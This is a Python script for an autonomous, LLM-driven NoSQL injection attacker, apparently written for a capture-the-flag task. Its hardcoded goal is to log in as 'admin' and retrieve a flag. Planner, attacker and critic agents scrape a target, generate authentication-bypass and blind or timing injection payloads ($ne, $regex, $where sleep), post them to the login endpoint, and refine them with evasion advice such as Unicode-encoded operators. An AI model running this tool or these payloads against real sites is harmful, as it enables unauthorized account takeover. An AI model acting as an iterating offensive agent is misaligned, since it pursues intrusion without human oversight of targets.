import sys
import json
import asyncio
import warnings
import nest_asyncio
import requests
from langgraph.graph import START, END, StateGraph
from langchain_core.messages import HumanMessage

from agents.outputs import (
    PlannerOutput,
    CriticOutput,
    ScannerInputOutput,
    call_ollama_with_json
)
from typing import TypedDict, Optional, Any, List, Union, Type
from langchain.tools import BaseTool
from pydantic import BaseModel, Field
import time
nest_asyncio.apply()
warnings.filterwarnings("ignore", category=ResourceWarning)


if len(sys.argv) < 4:
    print("Usage: python main.py <url> <model> <goal>")
    sys.exit(1)


def fetch_initial_scrape(url: str) -> str:
    """
    Fetch initial unauthenticated website scrape.
    Intentionally simple: no JS, no auth, no crawling.
    """
    try:
        r = requests.get(
            url,
            timeout=10,
            headers={
                "User-Agent": "Mozilla/5.0 (compatible; PentestScanner/1.0)"
            }
        )
        r.raise_for_status()
        return r.text
    except Exception as e:
        return f"[ERROR FETCHING URL] {e}"


async def main():
    start_time = time.perf_counter()

    url = sys.argv[1]
    MODEL = sys.argv[2]
    # goal = sys.argv[3]


    goal = "login with username 'admin' using nosql injection and retrieve ctf flag"

    print("[*] Fetching initial website scrape...")
    website_scrape = fetch_initial_scrape(url)

    # workflow state
    class FullPentestState(TypedDict):
        url: str
        goal: str
        entry_point: str
        website_scrape: str
        messages: List[Any]
        planner_output: Optional[Any]
        attack_results: Optional[List[Any]]
        critic_decision: Optional[str]
        critic_reasoning: Optional[str]  # NEW: Store critic's reasoning
        critic_suggestions: Optional[str]  # NEW: Store critic's suggestions
        previous_attempts: List[dict]  # NEW: Track all previous attempts
        final_report: Optional[str]
        iteration_count: int
        fields: List[str]

    async def scanner_input_structurer(state: FullPentestState):
        """Structure scanner inputs directly from website scrape."""
        
        prompt = f"""
You are a Scanner Input Structurer analyzing a website to determine NoSQL injection scanner inputs.

=== TARGET URL ===
{state['url']}

=== GOAL ===
{state['goal']}

=== INITIAL WEBSITE SCRAPE (RAW) ===
{state['website_scrape']}

Your task is to analyze the website scrape and determine the entry point and input fields for the form.

Identify:
1. Any forms present (action URLs, HTTP methods)
2. Input fields (e.g., username, password, email, search, filters)
3. Referenced API endpoints
4. Authentication or login-related functionality

Select ONE primary endpoint that is most likely vulnerable to NoSQL injection.
Prefer login endpoints, search/filter endpoints, or API endpoints accepting JSON bodies.

Return the scanner tool inputs with:
- target_url: The main application URL
- endpoint: Specific endpoint URL to test
- fields: List of input field names
"""

        result = await call_ollama_with_json(
            MODEL,
            prompt,
            ScannerInputOutput,
        )
        return {"scanner_tool_inputs": result["scanner_tool_inputs"],
                "entry_point": result["scanner_tool_inputs"]['endpoint'],
                "fields": result["scanner_tool_inputs"]['fields']}

    async def planner_agent(state: FullPentestState):
        """Generate payloads with feedback from previous iterations."""
        
        # Build context about previous attempts
        previous_context = ""
        if state.get("previous_attempts"):
            previous_context = "\n=== PREVIOUS ATTEMPTS SUMMARY ===\n"
            for i, attempt in enumerate(state["previous_attempts"], 1):
                previous_context += f"\nIteration {i}:\n"
                previous_context += f"Payloads tested: {len(attempt.get('payloads', []))}\n"
                previous_context += f"Results: {attempt.get('summary', 'N/A')}\n"
        
        # Include critic feedback if available
        feedback_context = ""
        if state.get("critic_suggestions"):
            feedback_context = f"""
=== CRITIC FEEDBACK FROM LAST ITERATION ===
Reasoning: {state.get('critic_reasoning', 'N/A')}

Suggestions: {state.get('critic_suggestions', 'N/A')}

IMPORTANT: Use this feedback to generate DIFFERENT payloads that address the identified issues.
"""
        
        prompt = f"""
You are a Penetration Testing Planner Agent creating NoSQL injection payloads.

=== TARGET URL ===
{state['entry_point']}

=== FIELDS REQUIRED ===
{state['fields']}

=== GOAL ===
{state['goal']}

=== ITERATION COUNT ===
{state['iteration_count']}

{previous_context}

{feedback_context}

Based on the context above, generate 5 specific NoSQL injection payloads to test.
Each payload should be ready to send in a POST request body.

{"IF THIS IS NOT YOUR FIRST ITERATION: Analyze the feedback and previous attempts. Generate DIFFERENT payloads that address the specific issues mentioned. DO NOT repeat payloads that already failed." if state['iteration_count'] > 0 else ""}

Target different NoSQL injection techniques:
1. Authentication bypass (e.g., {{"$ne": null}}, {{"$gt": ""}})
2. Boolean-based blind injection (e.g., {{"$regex": "^a.*"}})
3. Timing-based injection (e.g., {{"$where": "sleep(5000)"}})
4. Query operator injection (e.g., {{"$nin": []}}, {{"$exists": true}})
5. JavaScript injection (e.g., {{"$where": "this.username == 'admin'"}})

Each payload must include:
- field_names: List of fields to inject into (matching the detected fields)
- payloads: List of injection strings/JSON objects (one per field, in order)
- description: What vulnerability/technique this tests

CRITICAL: Make payloads progressively more sophisticated based on iteration count and feedback.
Early iterations: Simple bypasses
Later iterations: Advanced evasion, encoding, operator combinations

Return the endpoint URL and 5 NEW payloads.
"""
        
        result = await call_ollama_with_json(
            MODEL,
            prompt,
            PlannerOutput,
        )
        
        return {"planner_output": result}

    async def attacker_agent(state: FullPentestState):
        """Execute the planned payloads against the target."""
        planner_output = state["planner_output"]
        print('PLANNER OUTPUT')
        print(planner_output)
        endpoint = planner_output["endpoint"]
        payloads = planner_output["payloads"]
        
        attack_results = []
        
        print("\n=== EXECUTING ATTACKS ===")
        for i, payload_obj in enumerate(payloads):
            print(f"\n[*] Testing payload {i+1}/{len(payloads)}: {payload_obj['description']}")
            
            try:
                field_names = payload_obj["field_names"]
                payloads_list = payload_obj["payloads"]

                parsed_payloads = []
                for item in payloads_list:
                    try:
                        parsed = json.loads(item)
                        parsed_payloads.append(parsed)
                    except (json.JSONDecodeError, TypeError):
                        parsed_payloads.append(item)

                post_data = dict(zip(field_names, parsed_payloads))
                
                print('\ntrying...')
                print(f"endpoint: {endpoint}")
                print(f"post_data: {post_data}")
                response = requests.post(
                    endpoint,
                    json=post_data,
                    timeout=10,
                    headers={"User-Agent": "Mozilla/5.0 (compatible; PentestScanner/1.0)", "Content-Type": "application/json"}
                )

                result = {
                    "payload": payload_obj,
                    "status_code": response.status_code,
                    "response_body": response.text, 
                    "success": response.status_code == 200
                }
                
                print(f"  Status: {response.status_code}")
                print(f"  Response preview: {response.text[:100]}")
                
            except Exception as e:
                result = {
                    "payload": payload_obj,
                    "error": str(e),
                    "success": False
                }
                print(f"  Error: {e}")
            
            attack_results.append(result)
        
        return {"attack_results": attack_results}

    async def critic_agent(state: FullPentestState):
        """Evaluate results and decide next action with detailed feedback."""
        
        prompt = f"""
You are a Penetration Test Critic Agent evaluating attack results.

=== GOAL ===
{state['goal']}

=== ITERATION COUNT ===
{state['iteration_count']}

=== CURRENT PAYLOADS USED ===
{json.dumps(state['planner_output'], indent=2)}

=== CURRENT ATTACK RESULTS ===
{json.dumps(state['attack_results'], indent=2)}

=== PREVIOUS ATTEMPTS (if any) ===
{json.dumps(state.get('previous_attempts', []), indent=2) if state.get('previous_attempts') else "No previous attempts"}

Analyze the results and decide the next action:

**Decision Options:**
1. "replan" - Payloads failed but we can try different approaches (iteration < 5)
2. "success" - Goal was achieved, proceed to report writing
3. "failure" - Max iterations reached or attack not feasible (iteration >= 5)

**Success Indicators:**
- 200 status with authentication tokens or session cookies
- Response contains target data (e.g., CTF flag, admin access)
- Access granted to restricted resources
- Response differs from normal failed login (different length, headers, etc.)

**Evaluation Criteria:**
- Has the goal been achieved?
- Are we making progress? (different responses, status codes, error messages)
- What patterns do you see in failures? (WAF blocking, input validation, sanitization)
- What hasn't been tried yet?
- Have we exhausted reasonable attempts?

**If choosing "replan", provide SPECIFIC, ACTIONABLE suggestions:**
- Which payload types to try next (be specific about operators, techniques)
- What encoding or evasion methods to use
- Which fields to target differently
- What patterns in responses suggest next steps
- Specific payload examples to try

**Example good suggestions:**
- "Try Unicode encoding for $ operator (\\u0024ne instead of $ne)"
- "Responses show 'invalid user' - try $exists operator on username field"
- "401 errors suggest authentication logic - try $in operator with admin user array"
- "Try nested operators: {{\\"$not\\": {{\\"$ne\\": null}}}}"

Provide your decision, clear reasoning, and SPECIFIC suggestions for improvement.
"""
        
        result = await call_ollama_with_json(
            MODEL,
            prompt,
            CriticOutput,
        )
        
        # Store current attempt in history
        current_attempt = {
            "iteration": state["iteration_count"],
            "payloads": state["planner_output"]["payloads"],
            "results": state["attack_results"],
            "summary": result.get("reasoning", "N/A")
        }
        
        previous_attempts = state.get("previous_attempts", [])
        previous_attempts.append(current_attempt)
        
        return {
            "critic_decision": result["decision"],
            "critic_reasoning": result.get("reasoning", ""),
            "critic_suggestions": result.get("suggestions", ""),
            "previous_attempts": previous_attempts,
            "iteration_count": state["iteration_count"] + 1
        }

    async def report_writer_agent(state: FullPentestState):
        
        prompt = f"""
You are a Penetration Test Report Writer creating a comprehensive security assessment report.

=== TARGET URL ===
{state['url']}

=== GOAL ===
{state['goal']}

=== ALL ITERATIONS ===
{json.dumps(state.get('previous_attempts', []), indent=2)}

=== FINAL PAYLOADS TESTED ===
{json.dumps(state['planner_output'], indent=2)}

=== FINAL ATTACK RESULTS ===
{json.dumps(state['attack_results'], indent=2)}

[ROLE & BACKGROUND]

You are the **Report Writer Agent**, a concise technical writer specializing in pentest documentation. Your goal is to transform the raw exploit attempts and final success into a clear, professional markdown report.

[TASK OBJECTIVE]

Using the attempt history and the confirmed successful payload (or failure analysis), produce a concise yet insightful report that includes:

1. **Executive Summary**
    - One-paragraph overview of objectives and outcome.
2. **Methodology**
    - Briefly describe each phase (Scanning → Planning → Attacking → Evaluation → Critique).
    - Note the iterative approach with {state['iteration_count']} iterations.
3. **Key Findings**
    - Bullet-list of tested entry points, observed failure modes, and the one that succeeded (if any).
    - Include insights from each iteration.
4. **Successful Exploit Details** (if applicable)
    - Show the final payload mapped to each field, explain why it worked.
    - Note which iteration succeeded.
5. **Failed Attempts Analysis** (if no success)
    - Summarize what was tried across all iterations.
    - Explain why attacks failed (WAF, input validation, etc.).
6. **Security Implications & Recommendations**
    - Outline the vulnerability's impact and suggest remediation steps.
7. **Lessons Learned & Next Steps**
    - Note any patterns (e.g., WAF quirks, filtering) and propose further testing or defensive measures.

[OUTPUT FORMAT]
**Markdown Document**: Generate markdown with appropriately leveled headings (`#`, `##`, ), code blocks for payload examples, and tables or lists where helpful.
No Additional text.
"""
        
        result = await call_ollama_with_json(
            MODEL,
            prompt,
            dict, 
            print_output=False  
        )
        
        print("\n=== FINAL REPORT GENERATED ===")
        print(json.dumps(result, indent=2))
        
        return {"final_report": json.dumps(result, indent=2)}

    def route_after_critic(state: FullPentestState):
        """Route based on critic's decision."""
        decision = state["critic_decision"]
        
        print(f"\n[CRITIC DECISION]: {decision}")
        print(f"[ITERATION]: {state['iteration_count']}")
        
        if decision == "replan":
            print(f"[FEEDBACK]: {state.get('critic_suggestions', 'N/A')[:200]}...")
            return "planner_agent"
        elif decision == "success":
            return "report_writer"
        else:  
            return END

    graph = StateGraph(FullPentestState)
    
    # add all nodes
    graph.add_node("scanner_input_structurer", scanner_input_structurer)
    graph.add_node("planner_agent", planner_agent)
    graph.add_node("attacker_agent", attacker_agent)
    graph.add_node("critic_agent", critic_agent)
    graph.add_node("report_writer", report_writer_agent)

    # edges
    graph.add_edge(START, "scanner_input_structurer")
    graph.add_edge("scanner_input_structurer", "planner_agent")
    graph.add_edge("planner_agent", "attacker_agent")
    graph.add_edge("attacker_agent", "critic_agent")
    
    # conditional routing after critic
    graph.add_conditional_edges(
        "critic_agent",
        route_after_critic,
        {
            "planner_agent": "planner_agent",
            "report_writer": "report_writer",
            END: END
        }
    )
    
    graph.add_edge("report_writer", END)

    workflow = graph.compile()

    final_state = await workflow.ainvoke(
        {
            "messages": [
                HumanMessage(content="Execute NoSQL injection penetration test")
            ],
            "url": url,
            "goal": goal,
            "website_scrape": website_scrape,
            "planner_output": None,
            "attack_results": None,
            "critic_decision": None,
            "critic_reasoning": None,  # NEW
            "critic_suggestions": None,  # NEW
            "previous_attempts": [],  # NEW
            "final_report": None,
            "iteration_count": 0,
            "entry_point": "",
            "fields": [],
        },
        config={"recursion_limit": 50}
    )

    # calculate and output time taken for data collection

    end_time = time.perf_counter()

    elapsed_time = end_time - start_time
    print("\n=== TIME TAKEN ===")
    print(f"{elapsed_time:.4f} seconds")



if __name__ == "__main__":
    asyncio.run(main())